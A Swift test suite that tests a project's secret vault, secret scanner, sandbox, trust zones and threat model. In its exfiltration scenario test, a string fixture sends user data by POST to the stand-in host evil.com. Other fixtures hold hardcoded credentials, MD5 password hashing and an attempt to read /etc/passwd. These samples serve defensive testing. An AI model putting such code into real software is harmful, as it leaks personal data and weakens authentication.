//
//  SecurityPropertyTests.swift
//  HarmoniaModuleExperimental
//
//  HarmoniaModule/Security
//
//  Security property tests for doctrine bypass attempts.
//  "Red team" tests that try to break security invariants.
//  Not vibes - actual adversarial testing.
//

import Foundation
import Testing

// MARK: - Security Property Test Suite

/// Security property test suite for doctrine bypass attempts.
@Suite("Security Property Tests", .serialized)
struct SecurityPropertyTests {
    private let doctrineService: DoctrineDebtTaskService
    private let secretVault: SecretVault
    private let threatModel: ThreatModel
    
    init() throws {
        // Initialize services
        self.doctrineService = DoctrineDebtTaskService()  // Would need proper initialization
        self.secretVault = try SecretVault()
        self.threatModel = ThreatModel.default
    }
    
    // MARK: - Secret Management Tests
    
    /// Test that secrets cannot be exfiltrated from vault.
    @Test("Secrets cannot be exfiltrated from vault")
    func secretExfiltrationTest() async throws {
        // Store a test secret
        let testSecret = "test-api-key-12345"
        let metadata = SecretMetadata(
            name: "test-api-key",
            type: .apiKey,
            accessControl: AccessControlPolicy(
                allowedEngines: ["test-engine"],
                allowedTrustTiers: [.gold],
                allowedZones: [.trustedMutation],
                requiresAudit: true
            )
        )
        
        let secretId = try await secretVault.store(
            secret: testSecret,
            metadata: metadata,
            engineId: "test-engine",
            trustTier: .gold,
            zone: .trustedMutation
        )
        
        // Attempt to access with unauthorized engine (should fail)
        await #expect(throws: SecretVaultError.self) {
            _ = try await secretVault.retrieve(
                secretId: secretId,
                engineId: "unauthorized-engine",
                trustTier: .gold,
                zone: .trustedMutation
            )
        }
        
        // Attempt to access with insufficient trust tier (should fail)
        await #expect(throws: SecretVaultError.self) {
            _ = try await secretVault.retrieve(
                secretId: secretId,
                engineId: "test-engine",
                trustTier: .bronze,
                zone: .trustedMutation
            )
        }
        
        // Attempt to access from wrong zone (should fail)
        await #expect(throws: SecretVaultError.self) {
            _ = try await secretVault.retrieve(
                secretId: secretId,
                engineId: "test-engine",
                trustTier: .gold,
                zone: .untrusted
            )
        }
        
        // Clean up
        try await secretVault.delete(
            secretId: secretId,
            engineId: "test-engine",
            trustTier: .gold,
            zone: .trustedMutation
        )
    }
    
    /// Test that secret scanner detects hardcoded secrets.
    @Test("Secret scanner detects hardcoded secrets")
    func secretScannerTest() async throws {
        let scanner = try SecretScanner()
        
        // Create test file with hardcoded secret
        let tempDir = FileManager.default.temporaryDirectory
        let testFile = tempDir.appendingPathComponent("test_secret.swift")
        
        let testCode = """
        // Test file with hardcoded secrets
        let apiKey = "sk_test_1234567890abcdef"
        let password = "superSecret123!"
        let token = "ghp_abcdef1234567890"
        
        // This should not trigger
        let safeVariable = "not_a_secret"
        """
        
        try testCode.write(to: testFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: testFile) }
        
        // Scan for violations
        let violations = try await scanner.scan(fileAt: testFile.path)
        
        // Should find at least 3 violations
        #expect(violations.count >= 3)
        
        // Check that specific violations are found
        let violationRules = violations.map { $0.ruleId }
        #expect(violationRules.allSatisfy { $0 == "sec-secret-001" })
        
        // Check that safe variable is not flagged
        let violationContexts = violations.map { $0.context.lowercased() }
        #expect(!violationContexts.contains { $0.contains("not_a_secret") })
    }
    
    // MARK: - Doctrine Bypass Tests
    
    /// Test that critical security rules cannot be overridden.
    @Test("Critical security rules cannot be overridden")
    func criticalRuleOverrideTest() async throws {
        let securityPack = SecurityDoctrinePackV1()
        
        // Critical rules should not be overrideable at any trust tier
        let criticalRules = securityPack.rules.filter { $0.severity == .critical }
        
        for rule in criticalRules {
            // Should not be overrideable at bronze
            #expect(!securityPack.canOverride(ruleId: rule.id, at: .bronze))
            
            // Should not be overrideable at silver
            #expect(!securityPack.canOverride(ruleId: rule.id, at: .silver))
            
            // Should not be overrideable at gold
            #expect(!securityPack.canOverride(ruleId: rule.id, at: .gold))
            
            // Should not be overrideable at platinum
            #expect(!securityPack.canOverride(ruleId: rule.id, at: .platinum))
        }
    }
    
    /// Test that doctrine bypass attempts are detected.
    @Test("Doctrine bypass attempts are detected")
    func doctrineBypassDetectionTest() async throws {
        // Create test files with various bypass attempts
        let tempDir = FileManager.default.temporaryDirectory
        
        // Test 1: Obfuscated secret
        let obfuscatedFile = tempDir.appendingPathComponent("obfuscated.swift")
        let obfuscatedCode = """
        // Obfuscated secret attempt
        let keyParts = ["api", "_", "key"]
        let secret = keyParts.joined() + " = " + "\\"sk_test_123\\""
        // Actually: api_key = "sk_test_123"
        """
        
        try obfuscatedCode.write(to: obfuscatedFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: obfuscatedFile) }
        
        // Test 2: Base64 encoded secret
        let base64File = tempDir.appendingPathComponent("base64.swift")
        let base64Code = """
        // Base64 encoded secret
        let encoded = "c2tfdGVzdF8xMjM0NTY="  // sk_test_123456 in base64
        // Might be decoded at runtime
        """
        
        try base64Code.write(to: base64File, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: base64File) }
        
        // Test 3: Environment variable with default (hardcoded fallback)
        let envFile = tempDir.appendingPathComponent("env_fallback.swift")
        let envCode = """
        // Environment variable with hardcoded fallback
        let apiKey = ProcessInfo.processInfo.environment["API_KEY"] ?? "sk_test_default"
        // Hardcoded fallback is a secret
        """
        
        try envCode.write(to: envFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: envFile) }
        
        // Run security scouts on these files
        let secretsScout = SecretsSecurityScout()
        let authScout = AuthSecurityScout()
        
        let obfuscatedViolations = try await secretsScout.scan(fileAt: obfuscatedFile.path)
        let base64Violations = try await secretsScout.scan(fileAt: base64File.path)
        let envViolations = try await secretsScout.scan(fileAt: envFile.path)
        
        // At least some violations should be detected
        #expect(obfuscatedViolations.count + base64Violations.count + envViolations.count > 0)
    }
    
    // MARK: - Process Isolation Tests
    
    /// Test that process isolation prevents unauthorized operations.
    @Test("Process isolation prevents unauthorized operations")
    func processIsolationTest() async throws {
        let config = SandboxConfig.readOnlySandbox(projectPath: "/tmp")
        let runner = ProcessIsolationRunner(config: config)
        
        // Attempt to run command that should be blocked
        let result = try await runner.run(
            command: "/bin/ls",
            arguments: ["/etc/passwd"],  // Sensitive file
            engineId: "test-engine",
            operation: "unauthorized_file_access"
        )
        
        // Command should fail or be restricted
        #expect(!result.succeeded || result.output.isEmpty)
        
        // Attempt to run network command in read-only sandbox
        let networkResult = try await runner.runSwiftCode(
            """
            import Foundation
            let url = URL(string: "https://example.com")!
            let data = try Data(contentsOf: url)
            print(data.count)
            """,
            engineId: "test-engine",
            operation: "unauthorized_network"
        )
        
        // Network should be blocked in read-only sandbox
        #expect(!networkResult.succeeded)
    }
    
    /// Test that sandbox resource limits are enforced.
    @Test("Sandbox resource limits are enforced")
    func resourceLimitTest() async throws {
        let config = SandboxConfig(
            workingDirectory: "/tmp",
            maxMemoryMB: 10,  // Very low memory limit
            maxCPUTimeSeconds: 1  // Very low CPU limit
        )
        
        let runner = ProcessIsolationRunner(config: config)
        
        // Attempt to allocate large amount of memory
        let memoryResult = try await runner.runSwiftCode(
            """
            // Attempt to allocate large array
            var largeArray = [Int]()
            for i in 0..<10_000_000 {
                largeArray.append(i)
            }
            print("Allocated \\(largeArray.count) elements")
            """,
            engineId: "test-engine",
            operation: "memory_exhaustion"
        )
        
        // Should fail due to memory limit
        #expect(!memoryResult.succeeded || memoryResult.timedOut)
        
        // Attempt to run infinite loop
        let cpuResult = try await runner.runSwiftCode(
            """
            // Infinite loop
            while true {
                // Burn CPU
            }
            """,
            engineId: "test-engine",
            operation: "cpu_exhaustion"
        )
        
        // Should timeout due to CPU limit
        #expect(cpuResult.timedOut)
    }
    
    // MARK: - Trust Boundary Tests
    
    /// Test that trust boundaries are enforced.
    @Test("Trust boundaries are enforced")
    func trustBoundaryTest() async throws {
        let enforcer = TrustBoundaryEnforcer()
        
        // Test: Untrusted zone cannot write files
        let untrustedWrite = enforcer.canPerform(
            operation: .writeFiles,
            from: .untrusted,
            to: .trustedMutation,
            engineTrustTier: .gold
        )
        #expect(!untrustedWrite)
        
        // Test: Sandboxed zone cannot perform network calls
        let sandboxedNetwork = enforcer.canPerform(
            operation: .networkCalls,
            from: .sandboxed,
            to: .trustedNetwork,
            engineTrustTier: .silver
        )
        #expect(!sandboxedNetwork)
        
        // Test: Trusted mutation zone can write files with gold tier
        let trustedWrite = enforcer.canPerform(
            operation: .writeFiles,
            from: .trustedMutation,
            to: .trustedMutation,
            engineTrustTier: .gold
        )
        #expect(trustedWrite)
        
        // Test: Trusted mutation zone cannot write files with silver tier
        let trustedWriteSilver = enforcer.canPerform(
            operation: .writeFiles,
            from: .trustedMutation,
            to: .trustedMutation,
            engineTrustTier: .silver
        )
        #expect(!trustedWriteSilver)
        
        // Test: System zone can do anything
        let systemEverything = enforcer.canPerform(
            operation: .everything,
            from: .system,
            to: .system,
            engineTrustTier: .bronze
        )
        #expect(systemEverything)
    }
    
    /// Test that zone transitions require proper doctrine checks.
    @Test("Zone transitions require proper doctrine checks")
    func zoneTransitionTest() async throws {
        let enforcer = TrustBoundaryEnforcer()
        
        // Transition from untrusted to trusted mutation should require all checks
        let mutationChecks = enforcer.requiredDoctrineChecks(
            from: .untrusted,
            to: .trustedMutation
        )
        #expect(mutationChecks.contains(.security))
        #expect(mutationChecks.contains(.computerScience))
        #expect(mutationChecks.contains(.lawCompliance))
        
        // Transition from sandboxed to trusted network should require security and law
        let networkChecks = enforcer.requiredDoctrineChecks(
            from: .sandboxed,
            to: .trustedNetwork
        )
        #expect(networkChecks.contains(.security))
        #expect(networkChecks.contains(.lawCompliance))
        #expect(!networkChecks.contains(.computerScience))  // Not required for network
        
        // Transition within same zone should require security check
        let sameZoneChecks = enforcer.requiredDoctrineChecks(
            from: .trustedMutation,
            to: .trustedMutation
        )
        #expect(sameZoneChecks.contains(.security))
    }
    
    // MARK: - CI/CD Gate Tests
    
    /// Test that CI/CD gates block on insufficient security scores.
    @Test("CI/CD gates block on insufficient security scores")
    func cicdGateTest() async throws {
        let config = CICDGateConfig(
            minimumSecurityScore: 80.0,
            minimumDoctrineScore: 70.0,
            blockOnCritical: true,
            blockOnSecurityViolation: true
        )
        
        // Note: This test would require a mock doctrine service
        // For now, just test the configuration logic
        
        // Test that configuration values are bounded
        #expect(config.minimumSecurityScore >= 0.0 && config.minimumSecurityScore <= 100.0)
        #expect(config.minimumDoctrineScore >= 0.0 && config.minimumDoctrineScore <= 100.0)
        
        // Test that blocking violations list is not empty for production
        let productionConfig = CICDGateConfig.production
        #expect(!productionConfig.blockingViolations.isEmpty)
        
        // Test that development allows platinum override
        let developmentConfig = CICDGateConfig.development
        #expect(developmentConfig.allowPlatinumOverride)
    }
    
    // MARK: - Threat Model Tests
    
    /// Test that threat model has complete mitigations.
    @Test("Threat model has complete mitigations")
    func threatModelTest() async throws {
        let model = ThreatModel.default
        
        // Should have mitigations for all threat actors
        for actor in ThreatActor.allCases {
            let mitigations = model.mitigations[actor]
            #expect(mitigations != nil && !mitigations!.isEmpty, "No mitigations for \(actor.rawValue)")
        }
        
        // Should have security posture score calculation
        let score = model.securityPostureScore()
        #expect(score >= 0.0 && score <= 100.0)
        
        // Check that specific high-risk mitigations are implemented
        #expect(model.isMitigationImplemented("mit-local-001"))  // Process isolation
        #expect(model.isMitigationImplemented("mit-local-002"))  // Secret management
        #expect(model.isMitigationImplemented("mit-supply-001")) // Supply chain policy
    }
    
    /// Test that attack surfaces are properly defined.
    @Test("Attack surfaces are properly defined")
    func attackSurfaceTest() async throws {
        // All attack surfaces should have descriptions
        for surface in AttackSurface.allCases {
            let description = surface.description
            #expect(!description.isEmpty, "No description for \(surface.rawValue)")
        }
        
        // Should have all expected attack surfaces
        let surfaces = AttackSurface.allCases
        #expect(surfaces.contains(.fileSystem))
        #expect(surfaces.contains(.network))
        #expect(surfaces.contains(.process))
        #expect(surfaces.contains(.dependencies))
        #expect(surfaces.contains(.configuration))
        #expect(surfaces.contains(.doctrine))
        #expect(surfaces.contains(.governance))
    }
    
    // MARK: - Security Goal Tests
    
    /// Test that security goals map to doctrine rules.
    @Test("Security goals map to doctrine rules")
    func securityGoalTest() async throws {
        let goals = SecurityGoals()
        let doctrineMapping = goals.doctrineRules()
        
        // Should have mappings for all enabled goals
        #expect(doctrineMapping["confidentiality"] != nil)
        #expect(doctrineMapping["integrity"] != nil)
        #expect(doctrineMapping["auditability"] != nil)
        #expect(doctrineMapping["least_privilege"] != nil)
        
        // Confidentiality should include secret management rules
        let confidentialityRules = doctrineMapping["confidentiality"] ?? []
        #expect(confidentialityRules.contains("sec-secret-001"))
        #expect(confidentialityRules.contains("sec-llm-001"))
        #expect(confidentialityRules.contains("law-pii-001"))
        
        // Integrity should include auth and crypto rules
        let integrityRules = doctrineMapping["integrity"] ?? []
        #expect(integrityRules.contains("sec-auth-001"))
        #expect(integrityRules.contains("sec-crypto-001"))
        #expect(integrityRules.contains("cs-002"))
    }
    
    // MARK: - Adversarial Test Scenarios
    
    /// Test scenario: Supply chain attack attempt.
    @Test("Supply chain attack scenario")
    func supplyChainAttackTest() async throws {
        // This test simulates a supply chain attack attempt
        
        // 1. Attempt to introduce malicious dependency
        let maliciousPackage = """
        // swift-tools-version: 5.9
        import PackageDescription
        
        let package = Package(
            name: "MaliciousPackage",
            products: [
                .library(name: "MaliciousPackage", targets: ["MaliciousPackage"]),
            ],
            targets: [
                .target(
                    name: "MaliciousPackage",
                    dependencies: []
                ),
            ]
        )
        """
        
        // 2. Check that dependency scanning would catch this
        // (In real implementation, would integrate with OSV-Scanner or similar)
        
        // 3. Verify that SEC-SUPPLY-001 would be violated
        let supplyChainRule = SecurityDoctrinePackV1().rule(withId: "sec-supply-001")
        #expect(supplyChainRule != nil)
        #expect(supplyChainRule?.severity == .error)
        #expect(supplyChainRule?.blocking == false)  // Warning, not blocking
        
        // Note: Real implementation would test actual dependency scanning
    }
    
    /// Test scenario: Authentication bypass attempt.
    @Test("Authentication bypass scenario")
    func authBypassTest() async throws {
        // This test simulates authentication bypass attempts
        
        // 1. Hardcoded credentials
        let hardcodedAuth = """
        func authenticate(username: String, password: String) -> Bool {
            // BAD: Hardcoded credentials
            return username == "admin" && password == "admin123"
        }
        """
        
        // 2. Weak password hash
        let weakHash = """
        import CryptoKit
        
        func hashPassword(_ password: String) -> String {
            // BAD: Using MD5
            let data = password.data(using: .utf8)!
            let hash = Insecure.MD5.hash(data: data)
            return hash.map { String(format: "%02hhx", $0) }.joined()
        }
        """
        
        // 3. Missing session management
        let noSession = """
        class UserSession {
            // BAD: No session expiration
            var userId: String?
            var lastActivity: Date?
            
            func isValid() -> Bool {
                // Always valid - no expiration check
                return userId != nil
            }
        }
        """
        
        // These should all trigger SEC-AUTH-001 violations
        let authRule = SecurityDoctrinePackV1().rule(withId: "sec-auth-001")
        #expect(authRule != nil)
        #expect(authRule?.severity == .critical)
        #expect(authRule?.blocking == true)
    }
    
    /// Test scenario: Data exfiltration attempt.
    @Test("Data exfiltration scenario")
    func dataExfiltrationTest() async throws {
        // This test simulates data exfiltration attempts
        
        // 1. Direct network call with PII
        let directExfiltration = """
        import Foundation
import HarmoniaModule
        
        func sendUserData(user: User) {
            // BAD: Sending PII without governance approval
            let url = URL(string: "https://evil.com/collect")!
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.httpBody = try? JSONEncoder().encode(user)
            
            URLSession.shared.dataTask(with: request).resume()
        }
        """
        
        // 2. Indirect exfiltration through logs
        let logExfiltration = """
        func processPayment(card: CreditCard) {
            // BAD: Logging sensitive data
            print("Processing card: \\(card.number)")
            // ... processing logic
        }
        """
        
        // 3. LLM API with PII
        let llmExfiltration = """
        func analyzeMedicalRecord(record: MedicalRecord) {
            // BAD: Sending PII to external LLM
            let prompt = "Analyze this medical record"
            sendToOpenAI(prompt)
        }
        """
        
        // These should trigger various security rules
        #expect(SecurityDoctrinePackV1().rule(withId: "sec-local-001") != nil)
        #expect(SecurityDoctrinePackV1().rule(withId: "sec-log-001") != nil)
        #expect(SecurityDoctrinePackV1().rule(withId: "sec-llm-001") != nil)
    }
}

// MARK: - Fuzzing Tests

/// Fuzzing tests for security invariants.
@Suite("Security Fuzzing Tests", .serialized)
struct SecurityFuzzingTests {
    /// Fuzz test for secret vault access control.
    @Test("Fuzz secret vault access control", .tags(.security))
    func fuzzSecretVaultAccess() async throws {
        // Generate random inputs to test edge cases
        let vault = try SecretVault()
        
        for _ in 0..<100 {
            // Random engine ID
            let engineId = UUID().uuidString
            
            // Random trust tier
            let trustTiers: [TrustTier] = [.bronze, .silver, .gold, .platinum]
            let trustTier = trustTiers.randomElement() ?? .bronze
            
            // Random zone
            let zones: [TrustZone] = [.untrusted, .sandboxed, .trustedReadOnly, .trustedMutation, .trustedNetwork, .system]
            let zone = zones.randomElement() ?? .untrusted
            
            // Random secret ID (may or may not exist)
            let secretId = UUID().uuidString
            
            // Attempt to access (should either succeed or fail gracefully)
            do {
                _ = try await vault.retrieve(
                    secretId: secretId,
                    engineId: engineId,
                    trustTier: trustTier,
                    zone: zone
                )
                // If we get here, the secret existed and access was allowed
            } catch {
                // Access was denied or secret doesn't exist - this is expected
                #expect(error is SecretVaultError)
            }
        }
    }
    
    /// Fuzz test for doctrine rule validation.
    @Test("Fuzz doctrine rule validation", .tags(.security))
    func fuzzDoctrineRuleValidation() async throws {
        let securityPack = SecurityDoctrinePackV1()
        
        for _ in 0..<1000 {
            // Random rule ID (may or may not exist)
            let ruleId = "sec-\(Int.random(in: 1...999))-\(Int.random(in: 1...999))"
            
            // Random trust tier
            let trustTiers: [TrustTier] = [.bronze, .silver, .gold, .platinum]
            let trustTier = trustTiers.randomElement() ?? .bronze
            
            // Check if rule exists and can be overridden
            let canOverride = securityPack.canOverride(ruleId: ruleId, at: trustTier)
            
            // If rule doesn't exist, canOverride should be false
            if securityPack.rule(withId: ruleId) == nil {
                #expect(!canOverride)
            }
        }
    }
    
    /// Fuzz test for trust boundary enforcement.
    @Test("Fuzz trust boundary enforcement", .tags(.security))
    func fuzzTrustBoundaryEnforcement() async throws {
        let enforcer = TrustBoundaryEnforcer()
        
        for _ in 0..<1000 {
            // Random zones
            let zones: [TrustZone] = [.untrusted, .sandboxed, .trustedReadOnly, .trustedMutation, .trustedNetwork, .system]
            let sourceZone = zones.randomElement() ?? .untrusted
            let targetZone = zones.randomElement() ?? .untrusted
            
            // Random capability
            let capabilities: [ZoneCapability] = [
                .readFiles, .writeFiles, .parseContent, .executeCode,
                .limitedWrite, .analyze, .generateReports, .gitOperations,
                .backupRestore, .networkCalls, .apiAccess, .dataFetch, .everything
            ]
            let capability = capabilities.randomElement() ?? .readFiles
            
            // Random trust tier
            let trustTiers: [TrustTier] = [.bronze, .silver, .gold, .platinum]
            let trustTier = trustTiers.randomElement() ?? .bronze
            
            // Check if operation is allowed
            let allowed = enforcer.canPerform(
                operation: capability,
                from: sourceZone,
                to: targetZone,
                engineTrustTier: trustTier
            )
            
            // System zone should always be allowed
            if sourceZone == .system {
                #expect(allowed)
            }
            
            // Everything capability should only be allowed for system zone
            if capability == .everything {
                #expect(allowed == (sourceZone == .system))
            }
        }
    }
}

// MARK: - Performance Tests

/// Performance tests for security-critical operations.
@Suite("Security Performance Tests", .serialized)
struct SecurityPerformanceTests {
    /// Test secret vault performance under load.
    @Test("Secret vault performance", .tags(.performance, .security))
    func secretVaultPerformance() async throws {
        let vault = try SecretVault()
        
        // Store 100 secrets
        var secretIds: [String] = []
        
        await withTaskGroup(of: String.self) { group in
            for i in 0..<100 {
                group.addTask {
                    let secret = "secret-\(i)-\(UUID().uuidString)"
                    let metadata = SecretMetadata(
                        name: "test-secret-\(i)",
                        type: .apiKey,
                        accessControl: AccessControlPolicy(
                            allowedEngines: ["test-engine"],
                            allowedTrustTiers: [.gold],
                            allowedZones: [.trustedMutation]
                        )
                    )
                    
                    do {
                        return try await vault.store(
                            secret: secret,
                            metadata: metadata,
                            engineId: "test-engine",
                            trustTier: .gold,
                            zone: .trustedMutation
                        )
                    } catch {
                        return ""
                    }
                }
            }
            
            for await secretId in group {
                if !secretId.isEmpty {
                    secretIds.append(secretId)
                }
            }
        }
        
        // Retrieve all secrets
        await withTaskGroup(of: Void.self) { group in
            for secretId in secretIds {
                group.addTask {
                    _ = try? await vault.retrieve(
                        secretId: secretId,
                        engineId: "test-engine",
                        trustTier: .gold,
                        zone: .trustedMutation
                    )
                }
            }
        }
        
        // Clean up
        for secretId in secretIds {
            try? await vault.delete(
                secretId: secretId,
                engineId: "test-engine",
                trustTier: .gold,
                zone: .trustedMutation
            )
        }
    }
    
    /// Test doctrine scanning performance.
    @Test("Doctrine scanning performance", .tags(.performance, .security))
    func doctrineScanningPerformance() async throws {
        let secretsScout = SecretsSecurityScout()
        let authScout = AuthSecurityScout()
        
        // Create large test file
        let tempDir = FileManager.default.temporaryDirectory
        let testFile = tempDir.appendingPathComponent("large_test.swift")
        
        var testCode = "// Large test file\n"
        for i in 0..<1000 {
            testCode += "func testFunction\(i)() {\n"
            testCode += "    let variable\(i) = \"value\(i)\"\n"
            testCode += "    // Some comments\n"
            testCode += "    print(variable\(i))\n"
            testCode += "}\n\n"
            
            // Add some secrets every 100 lines
            if i % 100 == 0 {
                testCode += "let apiKey\(i) = \"sk_test_\(i)_secret\"\n"
            }
        }
        
        try testCode.write(to: testFile, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: testFile) }
        
        // Time the scans
        let startTime = Date()
        
        let secretsViolations = try await secretsScout.scan(fileAt: testFile.path)
        let authViolations = try await authScout.scan(fileAt: testFile.path)
        
        let endTime = Date()
        let duration = endTime.timeIntervalSince(startTime)
        
        // Should complete within reasonable time
        #expect(duration < 5.0, "Scanning took \(duration) seconds")
        
        // Should find some violations
        #expect(secretsViolations.count >= 10)  // At least 10 secrets (1000/100)
    }
}

// MARK: - Test Utilities

extension SecurityPropertyTests {
    /// Create a test file with specific content.
    private func createTestFile(content: String, extension: String = "swift") throws -> URL {
        let tempDir = FileManager.default.temporaryDirectory
        let testFile = tempDir.appendingPathComponent("test_\(UUID().uuidString).\(`extension`)")
        try content.write(to: testFile, atomically: true, encoding: .utf8)
        return testFile
    }
}

// MARK: - Test Tags

extension Tag {
    @Tag static var security: Self
    @Tag static var performance: Self
    @Tag static var fuzzing: Self
}
